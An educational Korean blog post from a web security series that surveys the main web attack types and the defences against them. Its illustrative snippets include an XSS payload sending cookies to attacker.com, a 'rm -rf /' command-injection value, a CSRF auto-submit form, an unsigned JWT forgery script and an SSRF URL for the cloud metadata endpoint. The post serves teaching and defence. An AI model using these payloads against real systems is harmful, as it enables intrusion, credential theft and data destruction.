---
title: "웹 공격 유형 총정리: 주요 공격의 작동 원리"
description: "웹 애플리케이션을 위협하는 주요 공격 유형을 분류하고 각 공격의 작동 원리를 설명합니다. 인젝션, 클라이언트 사이드 공격, 접근 제어 우회, 서버 사이드 공격, DoS까지 한눈에 정리합니다."
author: "PALDYN Team"
pubDate: "2026-06-09"
archiveOrder: 9
type: "knowledge"
category: "Security"
tags: ["웹공격", "SQL Injection", "XSS", "CSRF", "SSRF", "OWASP"]
featured: false
draft: false
---

[지난 글](/posts/websec-security-mindset/)에서 보안 마인드셋으로 공격자의 시각을 익혔다. 이제 실제로 어떤 공격들이 존재하는지 큰 그림을 그려보자. 웹 공격 유형을 체계적으로 이해하면 방어 전략을 세울 때 "어디에 무엇을 적용해야 하는가?"라는 질문에 빠르게 답할 수 있다. 이 글은 이후 각 공격을 심층 분석하는 글들의 네비게이션 역할을 한다.

## 공격 분류 맵

![웹 공격 유형 분류 맵](/assets/posts/websec-common-attack-types-map.svg)

웹 공격을 다섯 가지 대분류로 정리한다.

```text
분류 기준: 공격 목표와 메커니즘
1. 인젝션      — 악성 코드를 데이터처럼 삽입
2. 클라이언트  — 브라우저·사용자를 공격 도구로 활용
3. 접근 제어   — 인증·인가 체계 우회
4. 서버 사이드 — 서버 자체를 공격 도구로 활용
5. 가용성 공격 — 서비스를 마비시키거나 느리게
```

## 1. 인젝션 (Injection)

인젝션은 OWASP Top 10의 3위(2021년)에 올라 있는 가장 고전적이고 위험한 공격군이다. 핵심 원리는 하나다. **신뢰되지 않은 데이터가 명령어의 일부로 해석된다.**

![SQL Injection 공격 흐름](/assets/posts/websec-common-attack-types-flow.svg)

### SQL Injection

```sql
-- 공격자 입력: username = "admin' --"
-- 생성된 쿼리:
SELECT * FROM users WHERE username = 'admin' --' AND password = '...'
-- '--' 이후 주석 처리 → 비밀번호 검증 건너뜀
```

### Command Injection

```python
# 취약한 코드
import subprocess
def ping_host(hostname):
    # ❌ 사용자 입력을 셸 명령어에 직접 삽입
    result = subprocess.run(f"ping -c 1 {hostname}", shell=True, ...)
    # hostname = "google.com; rm -rf /"

# 안전한 코드
def ping_host_safe(hostname):
    # ✅ 리스트 형태 + shell=False
    result = subprocess.run(["ping", "-c", "1", hostname], shell=False, ...)
```

### SSTI (Server-Side Template Injection)

```python
# Flask/Jinja2 취약한 예시
@app.route('/greet')
def greet():
    name = request.args.get('name')
    # ❌ 사용자 입력을 템플릿 문자열로 렌더링
    return render_template_string(f"Hello {name}!")
    # name = "{{7*7}}" → "Hello 49!" (템플릿 실행됨)
    # name = "{{config.SECRET_KEY}}" → 시크릿 키 노출!
```

## 2. 클라이언트 사이드 공격

### XSS (Cross-Site Scripting)

```html
<!-- Reflected XSS -->
<!-- URL: /search?q=<script>document.location='http://attacker.com/steal?c='+document.cookie</script> -->
<h2>검색 결과: <script>document.location=...</script></h2>
<!-- 스크립트가 피해자 브라우저에서 실행 → 쿠키 탈취 -->

<!-- 방어: 출력 인코딩 -->
<h2>검색 결과: &lt;script&gt;...&lt;/script&gt;</h2>
```

### CSRF (Cross-Site Request Forgery)

```html
<!-- 공격자 사이트에 숨겨진 폼 -->
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker-account"/>
  <input type="hidden" name="amount" value="1000000"/>
</form>
<script>document.forms[0].submit();</script>
<!-- 피해자가 이 페이지를 열면 은행에 이체 요청이 자동 전송됨 -->
```

## 3. 접근 제어 우회

### IDOR (Insecure Direct Object Reference)

```http
# 정상 요청 (내 주문 조회)
GET /api/orders/1234  HTTP/1.1
Authorization: Bearer <token>

# 공격자가 다른 사람의 주문 조회
GET /api/orders/1235  HTTP/1.1
Authorization: Bearer <token>
# 서버가 주문 소유자 확인 없이 응답하면 → 모든 주문 열람 가능
```

### JWT Algorithm Confusion

```python
# alg=none 공격
import base64, json

header = {"alg": "none", "typ": "JWT"}
payload = {"user_id": 1, "role": "admin"}

# 서명 없이 토큰 조작
fake_token = (
    base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip("=")
    + "."
    + base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip("=")
    + "."  # 서명 없음
)
# 서버가 alg=none을 허용하면 → 서명 없이 admin 권한
```

## 4. 서버 사이드 공격

### SSRF (Server-Side Request Forgery)

```python
# 취약한 URL 페칭
@app.route('/fetch')
def fetch_url():
    url = request.args.get('url')
    # ❌ 사용자 제공 URL을 서버에서 직접 요청
    response = requests.get(url)
    # url = "http://169.254.169.254/latest/meta-data/"
    # → AWS 메타데이터 API에 접근, IAM 키 탈취 가능!
```

## 5. 가용성 공격

```python
# ReDoS — 정규식 서비스 거부
import re, time

# ❌ 취약한 정규식 (지수적 백트래킹)
pattern = r'^(a+)+$'
start = time.time()
re.match(pattern, 'a' * 30 + '!')  # CPU 수초~수십초 독점
# 서버가 이 요청 하나로 마비될 수 있음

# ✅ 타임아웃 설정 또는 안전한 정규식 사용
import signal
def timeout_handler(signum, frame):
    raise TimeoutError
signal.signal(signal.SIGALRM, timeout_handler)
signal.alarm(1)  # 1초 제한
```

## 공격 체인: 실제 공격은 복합적

실제 침해 사고의 대부분은 단일 취약점이 아니라 여러 공격이 연쇄된다.

```text
예시: 데이터 탈취 공격 체인

1단계: SQLi로 DB 크리덴셜 획득
2단계: 탈취한 크리덴셜로 관리자 로그인
3단계: 관리자 페이지의 파일 업로드로 웹쉘 설치
4단계: 웹쉘로 서버 내부망 접근
5단계: 내부망 DB 서버에서 전체 고객 데이터 추출

각 단계마다 하나의 방어가 성공했다면 연쇄가 끊어졌을 것이다
→ 심층 방어의 중요성
```

이 시리즈의 이후 글들은 각 공격 유형을 더 깊이 다룬다. HTTP 기초부터 시작해서 각 취약점의 원리, 데모, 방어 코드까지 순서대로 배워나갈 예정이다.

---

**지난 글:** [보안 마인드셋: 개발자가 가져야 할 보안 사고방식](/posts/websec-security-mindset/)

**다음 글:** [HTTP 보안 기초: 웹 보안의 기반이 되는 프로토콜 이해](/posts/websec-http-security-basics/)

<br>
읽어주셔서 감사합니다. 😊
